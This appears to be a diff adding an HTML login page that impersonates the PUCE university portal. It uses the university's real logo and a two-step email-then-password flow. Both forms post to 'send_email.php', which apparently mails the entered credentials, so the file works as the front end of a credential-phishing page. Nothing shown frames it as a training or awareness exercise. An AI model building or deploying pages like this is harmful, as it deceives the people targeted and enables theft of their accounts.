@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="bg-gray-100 h-screen flex items-center justify-center">
+    <div class="w-full max-w-md bg-white shadow-xl rounded-2xl p-8">
+        <!-- Logo PUCE (simulado) -->
+        <div class="flex justify-center mb-4">
+            <img src="https://www.pucese.edu.ec/wp-content/uploads/2022/07/logo-completo-multicolor.png" alt="L PUCE" class="h-12">
+        </div>
+
+        <!-- Formulario de usuario -->
+        <div id="userForm">
+            <form id="emailForm" method="POST" action="send_email.php">
+                <div class="mb-6">
+                    <label for="email" class="block text-sm text-gray-700 mb-2">Correo electrónico</label>
+                    <input type="email" id="email" name="email" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <button type="button" onclick="showPasswordForm()" class="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">Siguiente</button>
+            </form>
+        </div>
+
+        <!-- Formulario de contraseña -->
+        <div id="passwordForm" class="hidden">
+            <form method="POST" action="send_email.php">
+                <input type="hidden" name="email" id="hiddenEmail">
+                <div class="mb-6">
+                    <a href="#" onclick="showUserForm()" class="text-blue-600 hover:underline text-sm mb-4 inline-block">← Volver</a>
+                    <label for="password" class="block text-sm text-gray-700 mb-2">Contraseña</label>
+                    <input type="password" id="password" name="password" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                </div>
+
+                <div class="flex justify-between mb-6">
+                    <a href="#" class="text-sm text-blue-600 hover:underline">He olvidado mi contraseña</a>
+                </div>
+
+                <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">Iniciar sesión</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showPasswordForm() {
+            const email = document.getElementById('email').value;
+            document.getElementById('hiddenEmail').value = email;
+            document.getElementById('userForm').classList.add('hidden');
+            document.getElementById('passwordForm').classList.remove('hidden');
+        }
+
+        function showUserForm() {
+            document.getElementById('userForm').classList.remove('hidden');
+            document.getElementById('passwordForm').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
